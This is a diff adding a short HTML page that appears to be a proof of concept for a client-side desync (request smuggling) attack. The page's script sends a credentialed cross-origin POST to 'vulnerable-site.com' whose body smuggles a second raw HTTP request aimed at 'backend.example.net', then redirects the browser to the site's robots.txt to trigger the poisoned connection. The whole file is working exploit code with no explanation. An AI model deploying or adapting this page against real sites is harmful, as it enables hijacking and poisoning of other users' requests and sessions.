@@ -1,0 +1,16 @@
+<html>
+    <script>
+    fetch(`http://vulnerable-site.com/redirect-me?foo=${Date.now()}`, {
+        method: 'POST',
+        body: 'GET / HTTP/1.1\r\nHost: backend.example.net\r\nConnection: keep-alive\r\n\r\n',
+        mode: 'cors',
+        credentials: 'include',
+        redirect: "error"
+    }).catch(() => {
+        location = "http://vulnerable-site.com/robots.txt"
+    })
+    </script>
+    <script>
+        
+    </script>
+</html>
